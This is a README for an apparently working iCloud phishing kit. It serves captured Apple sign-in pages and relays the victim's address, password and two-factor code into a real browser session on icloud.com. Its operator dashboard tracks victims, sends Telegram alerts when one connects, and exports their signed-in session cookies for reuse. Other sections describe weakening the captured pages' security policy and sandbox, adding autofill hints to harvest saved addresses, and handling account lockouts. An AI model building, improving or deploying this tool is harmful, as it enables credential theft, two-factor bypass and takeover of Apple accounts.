# iCloud

FastAPI on port 9002. Visiting the page still opens a browser, loads
icloud.com and clicks Sign In. The page in the app is not that browser: once
Sign In has been clicked it becomes a capture you made earlier, served from
`src/` as a document of its own.

But it is not a picture of a page. The capture is wired to the browser the
server opened: what you type into it is written into the real sign-in form,
a button you press is pressed there as well, and what the browser is
showing is put back into the capture. The capture is the controls; the
browser is the session. That is what makes it remote browsing.

## Run

```bash
pip install -r requirements.txt
python server.py
```

Then open <http://localhost:9002>

On Windows, `run.bat` does the whole thing: creates `.venv`, installs the
requirements, installs Chromium, starts the server.

On Linux — and on macOS, which has the same shell — `run.sh` is the same
thing, and it sets the control room's secret on the way:

```bash
./run.sh                              # ICLOUD_ADMIN_TOKEN=MySecret123
ICLOUD_ADMIN_TOKEN=my-own-secret ./run.sh    # or your own
```

The first run is the setting up — the virtualenv, the requirements, and
Chromium — and every run after that goes straight to the server: all three
are done only when they are missing or `requirements.txt` has changed. The
secret is put in the environment and in no file, so nothing is left behind
to be committed; the one it sets is for trying the app out, so give it your
own anywhere else. It needs `python3`, and on Debian or Ubuntu the venv
module is a package of its own: `sudo apt install python3 python3-venv`.

Chromium is downloaded automatically on the first visit if it isn't already
there, so a machine that could not download it while the script was setting
up is not a machine that cannot run. To do it up front instead:

```bash
python -m playwright install chromium
```

Put your captured pages in `src/`, starting with `src/1.html`. The folder has
its own [README](src/README.md), and `/src/` lists whatever is in it.

> `requirements.txt` asks for `uvicorn[standard]`, not plain `uvicorn`. The
> socket needs a WebSocket implementation; without one uvicorn treats the
> upgrade as an ordinary HTTP request and answers 404.

## The control room

`/admin` is a dashboard for the operator: every session the server is
holding, how far each one has got, a note on Telegram when somebody new
connects, and the cookies of the sessions that are allowed to be exported.

```bash
ICLOUD_ADMIN_TOKEN=your-secret python server.py
```

Then open <http://localhost:9002/admin> and give it the secret. It is kept in
a cookie of its own (`HttpOnly`, `SameSite=Strict`) for a week, so a reload
opens the panel again instead of asking: the page asks the server whether it
is already let in, and subscribes on the way in if it is.

**The secret.** `ICLOUD_ADMIN_TOKEN` in the environment has it first: a
secret in a file on disk is a secret that can be committed by accident. It
can also live in `admin.json`, next to the app, which is written with the
permissions of a secret (0600) and is in `.gitignore`. A secret put in
`admin.json` while the server is running is picked up — the file is read
again when it changes — but a secret put in the *environment* has to be
there before the server starts, because that is what an environment is.

**The dashboard** shows what the server actually knows — the sessions it is
holding, what each one's browser is doing, the step it is on, and how long
ago it was seen. Nothing in it is made up, and nothing in it is a second
list: it is the same session manager the app itself works with (see [One
door](#one-door-the-session-manager)).

**The panel listens.** It is a subscriber. The session manager says what
changed — a client connects, a client goes, a client moves to the next step,
a browser shows something new — and the panel passes it on down one
WebSocket to whatever browser tabs are watching. The panel does not fetch
the client list every two seconds to find out what it has already been told.
If the secret is changed while a panel is open, that panel's line is closed
and it says so, and it keeps trying: a secret that is put back does not need
the panel reloaded.

**Connecting is a state of its own.** A visitor who has just opened the app
is connected before their browser is up, and the panel says so —
*Connecting…* — instead of calling them idle. The moment the browser comes
up they are *Online*, and the count of online browsers on the dashboard is
the number of browsers the server is really driving.

**Online and offline.** A client is a visitor, and a visitor's folder in
`visitors/` is their browser's profile — it is there whether they are here
or not.

* **Online** means the server is driving that client's browser right now.
  The panel shows where the browser is and what it is showing — the
  address, the page title, the step the client is on. The browser's status
  is the client's status.
* **Offline** means the browser is shut down but the profile is on disk.
  The panel says so, and the profile is still that browser's memory — so
  the cookies are still in it, and the panel can open the folder quietly
  (no window, closed again straight away) and read them out. The sign-in
  they did last time is in that folder.

So the cookies of an offline client are as readable as the cookies of an
online one: they are read from the profile that made them. A client whose
browser was shut down is *gone* — the panel still says where they got to
and when they were last here — and a client coming back is *here* again.

**It fits the screen it is on.** Nothing in the panel is allowed to make the
page wider than the screen. A session id, an error out of the browser, a line
out of the feed — they can all be longer than the panel they sit in, and each
of them wraps where it sits rather than pushing the page sideways: the page
itself never scrolls across, and the shell's content column is allowed to be
narrower than what is in it. The one thing that cannot wrap is a table —
eight columns of client, stage, progress, browser — so on a phone a row is
drawn as a card, one value to a line with the name of its column beside it,
and in the widths in between the table scrolls inside its own panel. The page
stays where it is; nothing has to be found by dragging it left and right.

**And what has piled up can be deleted.** A server that has been up for a day
has a feed of things nobody is going to read again, and a list of clients who
have gone. So the feed can be emptied — all of it with one button, or one line
at a time with the × beside it — and that is all it empties: the clients, their
cookies and their browsers are untouched.

A client who has gone can be deleted outright: their record, the cookies that
were written down, and their profile in `visitors/`, which is the cookies the
browser kept for itself. Deleting is not closing. Closing takes the browser
away and **keeps** the client — what they got to, and the cookies they left —
while deleting is the client gone, and nothing of them is left. That is why a
client whose browser is still running is refused: close the browser first, then
delete. Deleting asks before it does it.

**Presence is the person's, not the server's.** The server asks the browser
a question every half second, and that does not count as the visitor being
here: a session that counts the server's own polling as the visitor's
presence is a session that is never idle, and a browser that is never
closed. What counts is the page talking to the server — a person typing, a
person clicking, a page open — and a client with nobody watching is closed
after the idle time and remembered as one who has gone. A client who comes
back is here again, not gone.

**Closing a browser, by hand.** The idle time closes browsers nobody has been
at, on its own clock — but an operator should not have to wait for a clock, so
the panel closes them too:

* **Close**, on any client the server is holding: that client's browser is shut
  down, the screen it was on is put away with it, and the client moves to
  *Gone*. It is the same close the idle time does — one function, `close_client`
  in `admin.py`, used by both — so what is written down is the same either way.
* **Close idle browsers**, at the top of the list: every browser nobody has
  been at for five minutes, in one go. The panel asks the server who that is
  rather than deciding for itself, because the server is what knows who is
  looking and when each client was last seen. A client with a page open is
  never idle, however long they have sat on one screen.

Closing is not forgetting. The client stays on the list with where they got
to, the cookies that were read while the browser was still open are kept (in
the record and in `cookies/`), and the profile stays in `visitors/`. What goes
is the browser and its screen — which is what piles up.

```bash
curl -X POST localhost:9002/admin/api/clients/aprobevisitor42/close \
     -H "Cookie: icloud_admin=your-secret"          # one client
curl -X POST localhost:9002/admin/api/clients/close \
     -H "Cookie: icloud_admin=your-secret" \
     -d '{"idle_seconds": 300}'                      # the idle ones
```

A client who has already gone has no browser to close, and the panel says so
(`409`) rather than pretending something happened.

**The panel says why it is empty.** A refused answer used to look exactly
like a room with nobody in it: the counters stayed at zero and the table
said "no clients yet". Now a refusal is said out loud — the secret is
needed, or the server cannot be reached — with a button to give the secret
again.

**Telegram.** Put the bot token and the chat id in the Telegram tab and a
message goes out when a new client connects. The message is sent in the
background: the person connecting does not wait for Telegram, and Telegram
being down does not break the app. The token is never sent back to the page —
only its first and last four characters are.

**The cookies** are the browser's own, in the format Cookie Editor reads and
writes, so a file can be dropped straight into it. A session's cookies are
exported when the session has been *allowed* to be exported, by name, in the
panel — or when the request is that session's own visitor. Nobody else's
cookies are handed out because somebody asked.

A client whose browser has been shut down still has cookies: they are read
while the browser is open — when the client signs in, and again when their
browser is closed — and kept with the record of that client and in
`cookies/` on disk. So the **Get** button in the Cookies tab works for a
client who has gone as well as for one who is here, and after a restart of
the server as well as before one. The file it downloads is named after that
client.

**Signing in allows the export.** A client who has signed in does not need
to be allowed by hand: the app allows their session the moment the browser
is through, because the cookies of a signed-in session are the whole point
of the control room. The operator can still close it again in the panel;
nothing else is allowed on their behalf.

The panel is one page (`admin.html`), served by the same server, with the
font it uses served from the app as well: Space Grotesk, so the panel looks
the same whether the machine has a network or not.

## One door: the session manager

Every client comes through `sessions.py`, and nothing else keeps a list of
them. A visitor's session is made by `arrive`, found by `lookup`, and put
away by `retire`; those three are the door, and each of them says so to
whoever asked to be told.

That is a change, and it is worth saying why. The sessions used to be a dict
in `server.py`, the record of the clients who had gone was another, the panel
built its own list by importing the server and reading both, and the server
had to remember to poke the panel from every place a session changed. Every
place it forgot was a panel that quietly said the wrong thing: a client whose
browser had been closed could stay *online* in the table until something else
happened, and a client who had just arrived was shown as *idle* because the
thing that makes them online had not happened yet.

So the list lives in one place, and the panel subscribes to it:

```python
MANAGER.subscribe(heard)        # admin.py
```

* `arrive(sid, make)` is how a client gets a session. It says `connected`
  for somebody new, `back` for somebody whose profile was still remembered,
  and `here` for somebody who never left.
* `retire(sid, record)` is how a client goes. It keeps what they got to —
  the page, the step, the cookies that were read while the browser was still
  open — and says `gone`.
* `changed(session, why)` is said when something about a client is not what
  it was: the page they are on, the step they have reached, a browser coming
  up, somebody arriving at the capture or looking away.
* `sync()` is the safety net. On the same half-second the browsers are
  polled, the manager compares what it is holding with what it last said and
  says the difference. A change nobody remembered to announce is still a
  change the panel hears about.

The manager does not know what a panel is, and the panel does not ask the
manager for a list. It is told once, and it draws what the manager holds —
which is why the two cannot disagree about who is connected.

A subscriber is called with one event:

```json
{"kind": "connected", "session": "…", "at": 1763…, "revision": 7}
```

`revision` goes up with everything the manager says, so a panel can tell a
picture it has already drawn from a new one, and a tab that has been away is
not drawn backwards — a state older than the one on screen is dropped. The
manager is read the way a mapping is read (`in`, `len`, `.get`, `.values`),
but it is not written to from outside: a session comes to exist through
`arrive`, not through `sessions[id] = …`, because that is the way it gets
announced.

The one thing the manager does not do is draw. What a row says, what *gone*
looks like, and what the panel calls a step are the panel's business; the
manager only says what happened.

## The mirrored capture pipeline is gone

The old design had three moving parts: an agent in the real browser that
serialised the live document, a server that streamed it, and an engine in the
mirror that rebuilt it. All of it is gone — `agent.js`, `mirror.js`, the
document stream, the resource proxy, the screenshots, the click and keystroke
forwarding, and the `1.html` the server used to write out.

What replaced it is a file. A page that was captured earlier sits in `src/`,
the app opens it as a document of its own, and nothing about it has to be
reconstructed: it is the page, with the site's own markup, its own
stylesheets and its own shadow roots, laid out by the browser from the
capture itself.

That removes the class of bug the old pipeline kept producing. A capture sent
as patches has to address every patch to the right node, and nodes move; a
capture rebuilt from markup can quietly lose what the serialiser did not
carry. A static file cannot be addressed wrongly.

## How the app gets to the capture

There is no iframe. `/` is a splash screen and nothing else: a black screen
with the Apple mark breathing on it. No caption, no spinner, no links, no
"opening this / doing that". It opens the browser (`/start`) and, as soon as
`/status` answers `done` — the moment Sign In has been clicked — it replaces
itself with the captured page:

```js
location.replace("/src/1.html")
```

After that the capture is the *top-level document*. It is laid out at the
window's width, with its own scrollbars, fonts and title, instead of being a
page inside a frame inside a page. That was the thing an iframe got wrong: a
capture taken at 1440 px was being laid out at 900 px inside the frame, so it
reflowed, clipped and scrolled differently from the page it came from.

`/sync.js` does not change. It is injected into the page by the server and now
runs at the top level, so everything in the next section still holds.

Writing the capture into the launcher with `document.write` would have kept the
URL at `/`, and `sync.js` uses the URL to say which captured page is on screen
— every page would have called itself `/` and navigation between captures
would break. A navigation is the honest swap: same URL, same document, same
script behaviour as opening the file directly.

While the run is `done`, `/` redirects to the capture, so a reload comes back
to the page rather than to the splash. A browser that will not open does not
hold the page hostage either: on `error` the splash goes to the capture anyway,
and there is a 30 s cap in case the launch hangs. Nothing is ever shown about
it — the static capture is the point.

Nothing else changes on the way out: the capture is served exactly as it was
captured, plus the sync script (see below).

## Sign in still happens, in the real browser

`/start` launches a visible browser with a persistent profile, goes to
icloud.com and clicks Sign In, so you can sign in there yourself. That browser
is not mirrored any more: nothing is captured from it, and its window is not
what the app shows.

## The capture talks to the browser

A capture is a copy of a moment; the browser holds the session. The two are
tied together by their ids: a capture keeps the ids of the page it was taken
from, so the field with the id `account_name_text_field` in the capture is
the field with that id in the real page — in whichever frame of the browser
happens to hold it.

| In the capture | In the browser |
|---|---|
| a value typed into a field | the field with the same id, typed into, in whichever frame has it |
| a button pressed | the button with the same id, pressed |
| what the browser is showing | put back into the capture's fields |

Three things had to be true for any of this to work, and none of them were.

**The capture's policy has to let the engine in.** A SingleFile capture
carries the policy of the page it was taken from, and that policy is as
tight as policies get: `default-src 'none'`, so nothing loads and nothing
runs unless it is named. The engine is a script of ours, from our own
origin, and it opens a socket to our own origin — and the policy said no to
both, because it was written for a page that has no engine in it. So the
policy is served *extended*, not as it was: `script-src` gains `'self'`, and
`connect-src` is added. Everything the capture forbade stays forbidden, so
the page still renders exactly as it was captured. The nested document
inside an `<iframe srcdoc>` has a policy of its own, and that one is left
alone.

**The form has to be reachable.** The sign-in form is not in the capture's
own document: SingleFile keeps it inside an `<iframe srcdoc="…">`, and that
frame is sandboxed without `allow-same-origin`, so it is a frame of an
origin of its own and the page cannot reach it — not its fields, not its
buttons, nothing. So a frame the capture carries is served with
`allow-same-origin` added to its sandbox. Nothing else about it changes: it
keeps its sandbox, and it keeps its scripts.

**The engine has to look into the frame.** It does: the engine binds the
page and every frame it can reach, and an element in a frame is named by the
frame it is in first, so the same selector in two documents is two different
elements.

The engine asks where the browser is whenever it binds a document, so a
frame that has just loaded is told the state even when it was sent before
the frame was there. A field someone is typing into is never overwritten by
that state — their keystrokes are the newer truth.

**The value goes in as keys.** The sign-in widget is a widget: it watches
for keys, not for values. So what you type in the capture is *typed* into
the browser — clicked into, then typed, key by key — and the page reacts as
it would if a person were there. A value assigned behind the widget's back
sits in the field and the page is not moved by it. Where typing cannot
happen — the control is not on screen — the value is written the old way,
so that something is better than nothing.

**The typing carries on.** The letters that arrive while the person is
still typing are held back a moment and typed as one, with the cursor at
the end of what is already there. A field that is emptied and filled again
for every letter is a field the widget never gets to the end of — and a
field that is clicked into every time puts the cursor in the middle of it,
so the address comes out as `someone@exomample.c`.

**What the browser says, the capture says.** When the details are wrong,
the browser says so — *"Check the account information you entered and try
again."* The capture says it too, in the browser's own words, with the
link the browser carries, in the browser's own colours: the capture does
not carry the stylesheet for a message that was not there when it was
taken, so the way the browser shows it is read as well and put on the
message in the capture.

**The message takes the same room every time.** The complaint is put
where the browser puts it — above the footer, under the field it is
about — and the space it needs is measured from the page's *natural*
height, so the Sign In buttons do not creep further down every time the
details are wrong. The room is measured once, with the old complaint
taken away, and then the complaint is put in it.

**A press says what it did.** Apple's Continue stays disabled until the
form is filled in, and a click on a disabled button does nothing at all —
which looks, from the outside, like the bridge is not working. So the
console says `sign-in is disabled - the browser's form is not filled in
yet` rather than pretending it pressed something. And when the browser is
further behind than the capture — the capture shows the form, the browser
still shows the landing page — pressing Continue takes the sign-in
further, by pressing the browser's own sign-in button.

**A control with no id is named by its place.** Apple's verification code
boxes have no ids at all: six inputs and a hidden one. They are the third
input of the page, the fourth input of the page, and so on — and they are
written only when the live page has the same number of them. If it does
not, the right box cannot be told from the wrong one, and a code typed
into the wrong box is worse than no code at all, so nothing is written and
the console says so.

**A control with a class of its own is named by that class.** "The third
input of the page" is not the same box in two copies of a page that do
not hold quite the same inputs: Apple's widget can keep the sign-in form
in the page while the step underneath it changes, and the code boxes are
then the seventh input of one page and the first of the other. So a
control that has a class of its own is counted among the ones with that
class — "the third `form-security-code-input`" — and only those are
compared.

**The code goes in one box at a time, and the cursor moves on.** The
verification code is six boxes with a digit in each. Apple's own page says
so — *"On entering verification code in the input fields, the focus will
automatically move on to the next input fields"* — and the capture is a
picture of that page, so the script that does it is not there. So the
engine does it for it: a digit goes into the box it was typed in, the
cursor moves to the next box, and an emptied box takes the cursor back
with it. Each box holds one digit, and a second one replaces the first.

**The capture is the copy; the browser is the session.** A capture holds
the same ids as the page it was taken from, so a capture opened in the
same browser as the session would be written into instead of the session
— the value would go back into the copy on the screen. The pages the app
serves are therefore left out of the way.

**A value that has nowhere to go yet is kept.** The sign-in widget is a
frame on another origin, and Apple loads it a second or two after Sign In
is clicked. A value typed in that window has no field to go into, so it is
kept and tried again: the person does not have to type it twice. A press is
kept for a shorter while — a button pressed long after the person pressed
it is not what they asked for.

**What the browser is showing is read from every frame, not the first one.**
The sign-in form is in a frame and the document above it has no fields at
all, so reading only the top document is how a capture keeps a stale value
that the browser has already cleared.

**What this is not.** The capture can drive the browser; it cannot show a
page it has no capture of. The iCloud app after the sign-in is not a file in
`src/`, so the capture of the sign-in screen is all it can show. For a live
view of the browser itself, the mirror — an agent in the real browser that
streams the live document — is the other design, and it is a different
branch.

## The flow

Which capture leads to which is the user's, and it is said in a file next to
the captures: `src/flow.json`.

```json
{
  "blocked": {"says": "This Apple Account has been locked for security reasons",
              "go": "/src/5.html"},
  "steps": [
    {"page": "/src/1.html", "press": "sign-in", "go": "/src/4.html",
     "live": true},
    {"page": "/src/4.html", "press": "sign-in", "go": "/src/2.html",
     "live": true, "wait": true,
     "until": {"heading": "Two-Factor Authentication"},
     "edits": {"account_name_text_field": "/src/1.html"}}
  ]
}
```

`page` is the capture the press happened on, `press` is the id of the
control that was pressed (`"*"` for any control on that page), `go` is the
capture the app moves to, `live` says whether the press also happens in the
browser, and `wait` says that the app moves on when the *browser* has, not
when the button was pressed.

`until` names the page the browser has to be showing before the app moves
on — `"heading": "Two-Factor Authentication"` — and `edits` says where a
capture goes when a field on it is changed: editing the address on the
password step takes the capture back to the address, the way iCloud does it.

**And a step can end with the browser saying so.** `blocked` is not a step: it
is the page that says the account is locked. Apple locks an account that has
been signed in to from somewhere new, and the page it shows instead of carrying
on says *"This Apple Account has been locked for security reasons."* There is
no form coming, so the app stops waiting for one and takes the person to the
capture that says what happened — `/src/5.html`, in this repository's own
`src/`. It is asked of every reading of the browser, because the lock can come
in place of the password step as easily as in place of the code.

The session is marked as one that went wrong, with the browser's own words, so
the panel shows *Locked* in the stage column and the words underneath, and the
feed has the line. Nothing is closed: the page is theirs to read, and the
browser is theirs to shut. A flow with no `blocked` has no such page, and
nothing is taken anywhere.

**Everyone moves, including the viewer that pressed.** A button press is not
a link, so nothing else would take the viewer that pressed it to the next
capture while everybody else went on without it.

**A step without `live` does not touch the browser.** Pressing Continue on a
capture that has not asked for a password yet would submit an empty form to
the site. A step with `live` presses it in the browser as well — which is
what you want on the step where the form is filled in.

A press the flow does not mention still happens in the browser, as it always
did. There is no flow file, there is no flow.

The captures that are in `src/` are steps of the sign-in, and the flow file
that comes with them is:

| Capture | What it is | Pressing Continue |
|---|---|---|
| `1.html` | the address step | moves the app to `4.html` and presses Continue in the browser |
| `4.html` | the password step, with "remember me" | presses Continue in the browser, and moves the app to `2.html` **when the browser has taken the details** — if they are wrong, the app stays here and says what is wrong |
| `2.html` | the verification code step | — |

Editing the address on `4.html` takes the capture back to `1.html`, and the
password goes with it: the address is a different one, so the password that
went with the old one is of no use. That is what iCloud does.

## What stays in sync

A static page cannot know that anyone else is typing into it. So the server
holds the shared state and relays it over `/ws`:

| In the captured page | On the server |
|---|---|
| what you type into a field | the value, kept for the next viewer and the next reload |
| a checkbox, radio or select | its state, the same way |
| a click | relayed to the other viewers as a marker |
| following a link to another `/src/*.html` page | the shared page, so every viewer follows |

The rules that matter, and why:

**A value is sent after the word, not every letter.** `sync.js` waits 70 ms
after the last `input` event and sends the value then. Checkboxes, radios and
selects are one-shot and go at once. A value that has not changed since the
last message is not sent again.

**An applied value is not sent back.** Setting `.value` does not fire `input`,
and the apply path is wrapped anyway. Without that, two viewers would bounce
one field between them forever.

**A click is drawn, not replayed.** Replaying it in another viewer would press
the same button a second time. So the other viewers get a marker where the
click landed — visible, harmless, and honest about what it is.

**Navigation is the server's decision.** A link click is reported twice: over
the socket, and with `sendBeacon` as the page unloads, because a socket message
races the navigation. The server refuses anything that is not `/src/*.html`, so
a page cannot send every viewer somewhere else. A viewer that loads a page the
server is not on is redirected to the server's page — the server is the truth
about what is on screen, which is also what makes a late viewer land in the
right place.

**Form state belongs to the page it was typed on.** Following a link clears it.

**A link that leaves the captures is not followed, and a form is not
submitted.** Neither has anything behind it any more: the first would take the
page to some live site the server knows nothing about, the second would replace
the capture with the app's own 404. A same-page `#anchor` is left
alone, and the page's own click and submit handlers still run — only the
navigation is cancelled.

**A viewer that is not reading misses a message, it does not stall the page.**
Each viewer has its own queue; a full one drops the message.

**What is not carried.** Scroll position, focus, file inputs, and changes
made by the capture's own scripts — a menu opening, a tab switching, the site
re-rendering itself. Only what you do to the captured controls is relayed: the
page itself is not mirrored.

The state is in memory. Restarting the server clears it, and it is never
written back into `src/` — those files are the captures.

## Serving `src/`

One URL, one rule: **the file, plus the three things the engine needs.**

```html
<script src="/sync.js"></script>
```

That tag is the first of them. The second is the capture's own
`Content-Security-Policy`, extended with the sources the engine needs, and
the third is `allow-same-origin` on the frames the capture carries — both
explained in [the capture talks to the browser](#the-capture-talks-to-the-browser).

Nothing else is added: no meta is rewritten, no script is stripped, no
policy is removed, and the file on disk is never written to. The insertion
point is found by reading tags, not by searching for text, so it can never
land inside an attribute value: a SingleFile export keeps a whole nested
document in `<iframe srcdoc="…">`, and that one is left untouched.

- **Everything else is served as bytes**, with a content type from the file
  name. Keep a capture's stylesheets, scripts, images and fonts next to it.
- **Nothing outside `src/` is reachable.** A path that resolves elsewhere is
  answered as a missing page, not as a file read.
- **A missing page explains itself.** `/src/nope.html` is a 404 with a note
  saying where captures go and what is there now, so a fresh clone with an
  empty `src/` is not a blank page.

Everything is served `Cache-Control: no-store`, so an edited capture shows up
on reload.

## A light page, on a phone, in Montserrat

Three things about a capture are not true of every screen it is shown on, and
all of them are fixed by the engine at run time — never in the file:

**It is a light page.** Apple's stylesheet turns the page dark when the machine
showing it is in dark mode, which a phone usually is. Rather than overriding
one colour at a time, `sync.js` takes the dark rules out of the stylesheet
itself — every `@media (prefers-color-scheme: dark)` block, in the page and in
the frames it carries — so what is left is the page that was captured, with
its own light palette and nothing fighting it. The document is also told
`color-scheme: light`, so text boxes, dropdowns and the scrollbar are painted
light too, and not just the page around them.

The rules are removed, not the file: `src/` is exactly what was captured, and
a reload of the server puts it back the way it was.

**It fits a phone.** The sign-in form lives in a frame of a fixed height — the
height Apple's page had when it was captured, 209px — and that frame was told
not to scroll (`scrolling="no"`). Apple's own script grew the frame to fit its
form; a copy with no Apple script behind it does not, so on a phone, where the
same form needs more than 209px, the bottom of it is cut off. That is where
**Resend code to iPhone** went on the verification-code page: it is in the
markup, under the six boxes, and there was no way to reach it.

So every frame the page carries is measured and sized to what is in it — the
scroll height, and where the lowest thing in it really ends, which is what
catches a container that says "100% tall" and hides the rest. It is measured
again when the frame loads, when the page is resized, after a press, and after
a message arrives under a field, because all of those change how tall the form
is.

**Its fields say what they are, and the address comes back.** A browser fills
a field only when it can tell what the field is, and the sign-in form lives in
the widget frame — the last place a browser looks. So `sync.js` says it again
in every document it can reach, in the words every browser knows: the address
field becomes `autocomplete="username"`, `inputmode="email"`, `spellcheck="false"`;
the password field becomes `autocomplete="current-password"`. The capture's own
markup is not touched — this is the served page, said differently.

The addresses typed on this browser are also offered back by the app itself,
as a `<datalist>` on the field: the offer does not depend on a browser having
decided the page was worth remembering, and it is in the same document as the
field, so it works inside the frame. The last five are kept.

**And the address step comes back filled.** Apple puts the cursor in the
address field when that step opens. Editing the address on the password step
takes the capture back to the address step (that is the flow's own rule), and
the page that comes back is a new document with an empty field — while the
browser behind it knows the address perfectly well. So the browser's value is
written into a field that has only just been focused and has not been typed
into: the page's cursor is not the person typing. A field the person is
actually typing into is still theirs, and is never overwritten.

**It is read in Montserrat, and it does not flash.** One font for the whole
page, the frames included, and said with `!important` on every element rather
than left to inherit: Apple's stylesheet names a font on almost every element,
and a font named on the element itself is not inherited over.

The font is **carried inside the capture**, not fetched. `inline_font.py` puts
one `<style data-icloud=font>` into each file in `src/` — in the page's head,
and again in the head of the frame it carries, since a `<iframe srcdoc>` is a
document of its own and does not inherit the page's faces. The `@font-face`
source is the font file itself, base64, in a `data:` URL: there is nothing to
fetch, so nothing can arrive after the page has been drawn. The first line laid
out is already in Montserrat. A page that carried the font and then swapped it
in is exactly the flash this avoids, and `font-display: block` says so as well
— a font that arrives late should not be drawn over a fallback nobody asked
for.

It also means the files stand on their own: `src/2.html` opened straight from
disk, with no server and no engine, still reads in Montserrat.

The font is one variable file (`fonts/montserrat-latin.woff2`, weights
100–900), so one copy covers the headings, the body, the buttons and the six
code boxes alike: ~38 KB, ~51 KB once it is base64. It is not fetched from a
font house — a page that asks somebody else for its font is a page that looks
broken wherever that somebody cannot be reached, and this app is meant to run on
a machine that may have no network at all. The licence sits beside it: SIL Open
Font License 1.1, `fonts/OFL-Montserrat.txt`.

A page that did **not** bring its own copy — a capture refreshed and not yet run
through `inline_font.py` — is given the same face by the engine instead,
pointing at `/fonts/montserrat-latin.woff2`, which the server serves. Two faces
for one family is a choice the later one wins, so the engine leaves this one out
when the page already carries the font: otherwise the fallback, a fetch and the
flash would all come back.

The stack behind it is `"Helvetica Neue", Helvetica, Arial, sans-serif` — what
is used on a machine that will not take the font. Nothing here is a glyph that
stops being a glyph: the capture has no icon font of its own, its symbols are
SVG and images.

What the script writes into each page — one line, the base64 in full:

```html
<style data-icloud=font>
@font-face { font-family: 'Montserrat'; font-style: normal;
  font-weight: 100 900; font-display: block;
  src: url('data:font/woff2;base64,d09GMgABAAAA…') format('woff2'); }
html, body, body * {
  font-family: 'Montserrat', 'Helvetica Neue', Helvetica, Arial, sans-serif
               !important; }
</style>
```

And what the engine adds to every document it can reach, and nothing else:

```css
/* only for a page that did not bring its own copy of the font */
@font-face {
  font-family: "Montserrat";
  font-weight: 100 900;
  font-display: block;
  src: url("/fonts/montserrat-latin.woff2") format("woff2");
}
html, body, body * {
  font-family: "Montserrat", "Helvetica Neue", Helvetica, Arial, sans-serif
               !important;
}
body { overflow-x: hidden !important; }
iframe, frame { display: block !important; width: 100% !important; }
@media (max-width: 759px) {
  .home-login-component .parent-container { width: 100% !important; }
  .root-viewport { min-height: 100% !important; }
}
```

A frame from another origin is not this page's business: it cannot be read, so
it is neither re-coloured nor re-sized, and the engine carries on.

## The socket

One socket per viewer at `/ws`, plus `POST /nav` for the beacon.

Client to server:

```json
{"t": "hello", "page": "/src/1.html", "from": "http://localhost:9002/"}
{"t": "value", "key": "#account", "value": "someone@example.com", "checked": false}
{"t": "field", "id": "account_name_text_field", "value": "someone@example.com", "checked": false}
{"t": "press", "id": "sign-in"}
{"t": "click", "key": "#go", "x": 120, "y": 340}
{"t": "nav",   "page": "/src/2.html"}
{"t": "where"}
```

Server to client:

```json
{"t": "state", "page": "/src/1.html", "values": {"#account": {"value": "…", "checked": false}}}
{"t": "browser", "url": "https://idmsa.apple.com/signin", "title": "…", "fields": {"account_name_text_field": {"value": "…", "checked": false}}}
{"t": "value", "key": "#account", "value": "…", "checked": false}
{"t": "click", "key": "#go", "x": 120, "y": 340}
{"t": "nav",   "page": "/src/2.html"}
```

`field` and `press` are the bridge to the browser. `where` asks where the
browser is and `browser` is the answer: where it is, what it is called, and
what its fields hold. The server sends `browser` on its own when the browser
has moved on, and when a viewer asks.

`from` is the referrer: a hello whose referrer is another captured page is a
link being followed — the beacon may have been lost — and the hub moves to it.

`state` is what a viewer is given when it connects, or when it asks again after
reconnecting. Values and clicks are broadcast to the *other* viewers; the one
that sent them already has them.

An element is named by a CSS selector built from its id, or from its tag and
position when it has no id (`body > form > input:nth-of-type(2)`). Both copies
of a captured file have the same shape, which is all the name has to survive.

A dropped socket reconnects with backoff, 500 ms doubling to 5 s, and says
`hello` again when it does.

## Who the browser belongs to

Every visitor gets their own browser, their own profile and their own
capture. Two people using the app at the same time do not share a session,
do not share a page, and never see each other's typing.

The visitor is named by a cookie — a name, not a secret — and the name is
also the name of their profile: `profiles/<name>/` is that browser's
memory. It is what makes the session a session: the cookies, the "trust
this device" answer, the half-typed address are all still there when they
come back, because it is the same browser with the same profile.

The name is kept in two places, because it is worth keeping. The visitor's
own storage (`localStorage`) is how they are *remembered* — a person who
comes back is recognised, even if the cookie has gone, and lands in the
same session again. The cookie is how the server hears about it on every
later request, and the page says the name with the request as well
(`/start?visitor=…`), so the two agree.

The profile is kept where the base branch keeps it — `visitors/<name>/` —
so a browser that has already signed in is not asked to sign in again.

Two details matter more than they look:

- The cookie has to be a real `Set-Cookie`. A header called
  `icloud_session` with a name in it is only a header: the browser keeps no
  cookie, every request looks like a new visitor, and one person becomes
  twenty — twenty sessions, twenty browsers, twenty profiles.
- A route that only *reads* must only look the session up. `/status` is
  polled every two seconds; if a poll made a session of its own, it would
  give the same person a new browser every two seconds.

The browser is opened when the visitor asks for it (`/start`), and shut
down a quarter of an hour after they have gone away. The profile is kept
either way — that is the session.

## An account that is locked

After the password, Apple either asks for the code or locks the account: one
sign-in too many from a new place, and the sign-in screen is replaced by a
dialog that says *"This Apple Account has been locked for security reasons."*
with nothing to fill in at all.

That is not a step of the sign-in and not the end of it either, so it is a
capture of its own — `src/5.html` — and the flow names the words and the page:

```json
{"blocked": {"says": "This Apple Account has been locked for security reasons",
             "go": "/src/5.html"}}
```

The browser is read for what it says, not only for what it asks: the dialog's
own title (`#alertInfo`) comes back with the rest of the reading, and when it
matches those words every viewer is taken to that page. The stage column says
**Locked**, the words are shown under it, and the feed has the line, because a
session that ends this way is one the operator needs to see.

## The app does not move on until the browser has

A step in the flow can say `"wait": true`, and then the capture does not
move to the next one because a button was pressed — it moves when the
browser has taken the details and gone on to the next step. Until then the
capture stays where it is, and what the browser says about the details —
*"Check the account information you entered and try again."* — is shown on
it.

A person who has typed the wrong password should not be carried off to the
next page as if they had not.

Two things count as "the browser has gone on", and neither of them is a
complaint:

- **There is no complaint.** While the browser is saying the details are
  wrong, the capture stays exactly where it is. The complaint is the
  answer, and there is no next step to go to yet.
- **The form is gone.** The sign-in fields are not there any more, and the
  next step is there instead.

A step can also name the page the browser has to be showing:

```json
{"page": "/src/4.html", "press": "sign-in", "go": "/src/2.html",
 "live": true, "wait": true, "until": {"heading": "Two-Factor Authentication"}}
```

Then the capture moves on when the browser's own heading says *"Two-Factor
Authentication"* — and not before. The sign-in fields are not a good enough
sign of that: Apple's widget can keep the form in the page while the step
underneath it changes, so a form that is still there may be a form nobody is
looking at any more, and the app would sit on the sign-in page for ever. A
complaint still comes first: it means the details are wrong, and there is no
next step to go to yet.

The fields that are watched are the ones the person filled in. A box that
was ticked is not one of them: "Keep me signed in" is still on the page
when the sign-in form turns into the code step, and watching it would hold
the app on the sign-in page for ever.

